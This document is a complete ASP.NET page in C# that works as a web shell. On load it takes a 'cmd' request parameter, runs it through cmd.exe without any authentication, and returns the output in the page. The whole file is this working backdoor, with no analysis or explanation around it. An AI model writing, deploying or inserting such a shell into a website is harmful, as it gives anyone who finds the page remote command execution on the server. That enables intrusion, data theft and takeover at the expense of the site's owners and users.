<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process p = Process.Start(psi);
        string output = p.StandardOutput.ReadToEnd();
        Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
    }
}
</script>
